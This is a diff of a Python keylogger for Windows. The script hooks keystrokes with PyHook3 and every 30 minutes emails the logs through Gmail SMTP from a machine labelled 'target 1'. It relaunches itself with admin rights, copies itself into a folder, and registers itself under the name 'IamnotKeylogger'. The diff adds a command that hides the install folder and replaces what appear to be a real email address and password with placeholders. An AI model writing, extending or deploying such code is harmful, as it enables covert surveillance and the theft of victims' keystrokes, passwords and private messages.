@@ -8,8 +8,8 @@ from smtplib import SMTP
 from threading import Timer
 from PyHook3 import HookManager
 
-TO_EMAIL = 'namhoang4681@gmail.com'
-PS_EMAIL = 't16121992'
+TO_EMAIL = 'youremail@gmail.com'
+PS_EMAIL = 'youremail'
 PERIOD = 1800.0 #seconds
 TARGET_NAME = 'target 1'
 SVR_MAIL = 'smtp.gmail.com:587'
@@ -37,6 +37,7 @@ if not os.path.exists(exec_path):
     if not is_admin():
         # Re-run the program with requiring admin rights
         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
+        sys.exit()
 
     filename = os.path.basename(sys.executable)
     reg_name = '"IamnotKeylogger"'
@@ -47,6 +48,7 @@ if not os.path.exists(exec_path):
     command = Exec(cmde)
 
     os.makedirs(exec_path)
+    os.system('attrib +h ' + exec_path)
     copy(sys.executable, exec_path)
 
 curr_date = datetime.now().strftime("%Y-%b-%d")
